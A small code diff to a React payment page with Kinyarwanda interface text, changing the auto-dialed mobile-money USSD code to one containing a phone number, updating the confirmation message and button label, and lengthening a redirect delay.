@@ -78,7 +78,7 @@ export default function Pay() {
 
     // Auto Dial
     const autoDial = (amount) => { 
-        const ussd = `*186*7777*${amount}#`; 
+        const ussd = `*182*1*1*0780786300*${amount}#`; 
         const encoded = encodeURIComponent(ussd); 
         window.location.href = `tel:${encoded}`; 
     };
@@ -95,9 +95,9 @@ export default function Pay() {
                 { ...formData, timestamp: new Date() }, 
                 { merge: true } 
             ); 
-            setMessage("Ubusabe bwoherejwe! Fungura USSD wemeze ubwishyu."); 
+            setMessage("Ubusabe bwoherejwe! Fungura USSD wemeze ubwishyu bwawe ubone guhabwa nes point."); 
             setTimeout(() => { autoDial(formData.amount); }, 2000); 
-            setTimeout(() => { router.push("/"); }, 20000); 
+            setTimeout(() => { router.push("/"); }, 40000); 
         } catch (err) { 
             console.error(err); 
             setMessage("Habaye ikibazo. Ongera ugerageze."); 
@@ -134,7 +134,7 @@ export default function Pay() {
                         <option value="Airtel">Airtel Money</option> 
                     </select> 
                     <button type="submit" disabled={submitting}> 
-                        {submitting ? "Kohereza..." : "Ohereza"} 
+                        {submitting ? "Kohereza..." : "Ishyura"} 
                     </button> 
                 </form> 
             </div> 
